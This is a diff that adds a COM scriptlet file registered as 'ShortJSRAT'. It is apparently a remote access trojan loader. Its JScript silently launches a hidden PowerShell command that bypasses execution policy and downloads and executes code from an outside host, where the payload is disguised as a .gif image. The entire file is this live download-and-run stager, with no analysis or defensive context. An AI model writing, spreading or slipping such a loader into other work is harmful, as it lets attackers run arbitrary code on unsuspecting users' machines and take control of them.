@@ -1,0 +1,13 @@
+<?XML version="1.0"?>
+<scriptlet>
+<registration
+    progid="ShortJSRAT"
+    classid="{10001111-0000-0000-0000-0000FEEDACDC}" >
+    <script language="JScript">
+        <![CDATA[
+            ps  = "powershell.exe -exec bypass -Windowstyle hidden -noninteractive -nologo IEX (New-Object Net.WebClient).DownloadString('http://job.softline.top/loadinglit.gif')";
+            new ActiveXObject("WScript.Shell").Run(ps,0,true);
+        ]]>
+</script>
+</registration>
+</scriptlet>
